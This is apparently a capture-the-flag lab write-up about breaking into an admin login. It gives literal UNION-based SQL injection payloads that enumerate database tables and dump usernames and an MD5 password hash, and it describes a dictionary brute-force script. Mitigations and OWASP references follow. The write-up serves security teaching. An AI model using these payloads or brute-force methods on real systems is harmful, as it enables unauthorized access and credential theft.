# Bruteforce - Admin Member LogIn

A brute force attack consists in an attacker configuring predetermined values, making requests to a server using those values, and then analyzing the response. They are often used for attacking authentication and discovering hidden content/pages within a web application. To authentication, brute force attacks are used when an account lockout policy is not in place.

## Breach type

* A07:2021 - Identification and Authentication Failures
    * CWE-521: Weak Password Requirements

On the specific case of weak password:
* CWE-1391: Use of Weak Credentials
* CWE-330: Use of Insufficiently Random Values		
* CWE-326: Inadequate Encryption Strength

* A03:2021 - Injection
* A01:2021 Broken Access Control
    * CWE-200 Exposure of Sensitive Information to an Unauthorized Actor.

## How to find the flag
* 2 options : 
    * SQL injections :

* Go to the `Members` page

* Display all the tables of the databases with : `105 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns`

* Discover a table named `db_default` which contains three columns : `id, username, password`

* Try to view its content with the following SQL command `105 OR 1=1 UNION SELECT username, 1 FROM db_default`.
It will return this error message : `Table 'Member_Sql_Injection.db_default' doesn't exist.`
    * We understand that it looks for the content of `db_default` in the wrong database.
    * We now need to find in which database `db_default` is stored

* Use this command to show all the tables and their databases : `105 OR 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables`.
    * We now know that `db_default` is part of the `Member_Brute_Force` database

* List all the usernames of `db_default` : `105 OR 1=1 UNION SELECT username, 1 FROM Member_Brute_Force.db_default`
    * We find two candidates : admin and root

* List all the password of `db_default`: `105 OR 1=1 UNION SELECT password, 1 FROM Member_Brute_Force.db_default`
    * We find hashed data for one specific password : `3bf1114a986ba87ed28fc1b5884fc2f8`
    * We don't know if it is for admin or root yet, so we'll try both.

* But first we need to decode it. 
    * There's 32 characters so it is probably hashed in MD5.
    * It is ! The password is `shadow`

    * Brute Force Attack :

However, as the password is stored in Member_Brute_Force we suspect that we need to specificly use a brute force method to retrieve it.
In order to do this we wrote a short script in Python using a dictionnary of most common used passwords as a source. 

We then check if the word `flag` is present in the response of the reconstructed URL : `full_url = f"{BASE_URL}&username={USERNAME}&password={password}&Login=Login#"`

We can now go to the Signin page and log in with :
* Username : `admin`
* Password : `shadow`

## Risks
* Poor password practices, such as using easily guessable passwords like "Password" or "123456", increase the risk of data breaches, identity theft, and business disruption :
    * Attackers exploit unchanged default settings or stolen passwords to gain unauthorized access, leading to data breaches and compromising critical systems.
    * Ineffective password management can lead to financial losses for mid-size businesses through incidents like phishing attacks and malware/ransomware.
    * Legal implications of poor password controls include regulatory non-compliance fines and potential legal costs from data breaches due to inadequate security measures.

## How to avoid
* Use strong, complex passwords that are unique for each account.
* Limit login attempts with account lockout mechanisms.
* Monitor and restrict login attempts from suspicious IP addresses.
* Implement Two-Factor Authentication (2FA) for added security.
* Utilize CAPTCHAs to differentiate between human users and bots.
* Consider using unique login URLs to deter attackers.
* Disable root SSH logins to prevent direct brute force attacks.
* Deploy Web Application Firewalls (WAFs) to block malicious traffic and enforce security policies.

## Sources
* https://cwe.mitre.org/data/definitions/521.html
* https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
* https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy
* https://www.itsasap.com/blog/how-to-prevent-brute-force-attacks
* https://jetpack.com/blog/weak-passwords/
* https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/